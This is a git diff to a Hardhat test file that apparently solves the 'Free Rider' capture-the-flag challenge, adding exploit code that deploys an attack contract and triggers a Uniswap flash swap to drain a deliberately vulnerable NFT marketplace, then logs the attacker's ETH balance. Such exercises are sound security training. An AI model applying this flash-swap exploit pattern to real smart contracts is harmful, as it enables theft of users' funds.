@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { makeGetInstanceFunction } = require("@openzeppelin/hardhat-upgrades/dist/admin");
 
 describe('[Challenge] Free Rider', function () {
     let deployer, attacker, buyer;
@@ -105,6 +106,26 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        
+        const FreeRiderAttack= await ethers.getContractFactory('AttackFreeRider', attacker);
+        const attackContract = await FreeRiderAttack.deploy(this.weth.address, this.uniswapPair.address, this.token.address, this.marketplace.address, this.buyerContract.address, this.nft.address);
+
+        const logBalances = async (address, name) => {
+            const ethBal = await ethers.provider.getBalance(address);
+            
+            console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
+            console.log("")
+        }
+
+        console.log("Initial balances");
+        await logBalances(attacker.address, "attacker");
+
+        await attackContract.flashSwap(this.weth.address, NFT_PRICE, {gasLimit: 1e6});
+
+
+        console.log("Initial balances");
+        await logBalances(attacker.address, "attacker");
     });
 
     after(async function () {
